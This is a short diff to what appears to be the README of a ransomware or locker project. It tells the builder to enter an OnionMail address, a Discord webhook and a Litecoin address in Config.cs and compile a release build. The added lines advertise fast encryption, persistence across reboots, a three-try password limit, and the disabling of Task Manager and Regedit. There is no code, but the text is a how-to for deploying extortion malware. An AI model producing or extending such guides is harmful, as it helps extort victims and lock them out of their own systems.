@@ -11,6 +11,13 @@ Download Src<br />
 Go into Config.cs<br />
 Input ur OnionMail + Discord Webhook and ur LTC address the rest is just goofy and random stuff<br />
 Set The Arch to Release instead of debug and Compile Have Fun :3<br />
+## Features
+
+- Max 3 Password Tries
+- Reboot Proof
+- Fast Encryption
+- Disables Taskmanager
+- Disables Regedit
 
 # Made by
 
